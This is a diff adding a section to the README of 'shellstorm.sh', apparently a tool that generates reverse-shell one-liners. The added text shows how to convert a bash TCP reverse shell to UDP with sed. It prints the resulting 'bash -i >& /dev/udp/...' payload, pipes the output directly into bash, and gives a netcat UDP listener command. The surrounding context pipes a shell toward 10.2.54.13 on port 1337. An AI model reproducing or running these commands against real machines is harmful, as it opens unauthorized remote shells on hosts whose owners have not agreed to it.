@@ -50,3 +50,17 @@ In some cases you can download shellstorm in any 'target' machine with Linux ker
 bash shellstorm.sh bash 10.2.54.13 1337 | bash
 </pre>
 
+Do you want UDP shell? No problem, 'sed' it.
+<pre>
+bash shellstorm.sh bash 127.0.0.1 1337 | sed -e 's/tcp/udp/g'
+Output:
+bash -c "bash -i >& /dev/udp/127.0.0.1/1337 0>&1"
+</pre>
+
+You can pipe it too.
+<pre>
+bash shellstorm.sh bash 127.0.0.1 1337 | sed -e 's/tcp/udp/g' | bash
+Note:  
+Remember use -u (udp) flag in netcat listener as following:  
+nc -u -lvp 1337
+</pre>
